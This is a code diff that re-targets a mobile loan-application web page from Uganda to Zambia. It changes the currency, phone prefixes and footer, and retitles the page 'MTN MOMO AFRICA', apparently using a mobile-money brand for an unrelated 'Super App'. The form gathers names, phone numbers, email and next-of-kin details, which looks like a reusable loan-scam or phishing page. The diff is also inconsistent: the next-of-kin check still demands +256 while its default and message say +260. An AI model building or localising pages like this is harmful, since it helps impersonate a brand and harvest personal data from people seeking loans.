@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Ombi la Mkopo - Super App</title>
+    <title>MTN MOMO AFRICA </title>
     <style>
         :root {
             --primary-blue: #0A3D7E;
@@ -219,9 +219,9 @@
             <h2 class="title">Loan Details</h2>
             
             <div class="slider-box">
-                <label>Loan Amount (UGX)</label>
+                <label>Loan Amount (ZMW)</label>
                 <input type="range" min="30000" max="600000" id="amount" class="slider" oninput="updateValues()">
-                <p id="amountDisplay" class="val-display">UGX 100,000</p>
+                <p id="amountDisplay" class="val-display">ZMW 100,000</p>
             </div>
 
             <div class="slider-box">
@@ -243,7 +243,7 @@
             <input id="lname" placeholder="Last Name" type="text">
             
             <label>Phone Number</label>
-            <input id="phone" value="+256" placeholder="Phone Number" type="tel" inputmode="tel">
+            <input id="phone" value="+260" placeholder="Phone Number" type="tel" inputmode="tel">
             
             <label>Email Address</label>
             <input id="email" placeholder="Email Address" type="email">
@@ -259,7 +259,7 @@
             <input id="klname" placeholder="Next of Kin Last Name" type="text">
             
             <label>Next of Kin Phone Number</label>
-            <input id="kphone" value="+256" placeholder="Phone Number" type="tel" inputmode="tel">
+            <input id="kphone" value="+260" placeholder="Phone Number" type="tel" inputmode="tel">
 
             <input id="relationship" placeholder="Relationship (Example: Wife, Husband, Brother)">
             
@@ -294,7 +294,7 @@
     </div>
 
     <div class="footer">
-        &copy; 2026 Uganda Super App. All rights reserved.
+        &copy; 2026 Zambia Super App. All rights reserved.
     </div>
 
     <div id="pageLoader" class="loader">
@@ -359,10 +359,10 @@
             const email = document.getElementById('email').value.trim();
             
             const nameRegex = /^[A-Za-z]+$/;
-            const ugPhoneRegex = /^\+256[0-9]{9}$/;
+            const ugPhoneRegex = /^\+260[0-9]{9}$/;
 
             if(!fname || !lname || !phone || !email) return showError("Please input the required fields.");
-            if(!ugPhoneRegex.test(phone)) return showError("Please enter a valid UG phone number (+256...)");
+            if(!ugPhoneRegex.test(phone)) return showError("Please enter a valid Zambian phone number (+260...)");
 
             localStorage.setItem('fname', fname);
             localStorage.setItem('lname', lname);
@@ -380,7 +380,7 @@
             const ugPhoneRegex = /^\+256[0-9]{9}$/;
 
             if(!kfname || !klname || !kphone) return showError("Please input the required fields.");
-            if(!ugPhoneRegex.test(kphone)) return showError("Please enter a valid UG phone number (+256...)");
+            if(!ugPhoneRegex.test(kphone)) return showError("Please enter a valid Zambian phone number (+260...)");
 
             localStorage.setItem('kfname', kfname);
             localStorage.setItem('klname', klname);
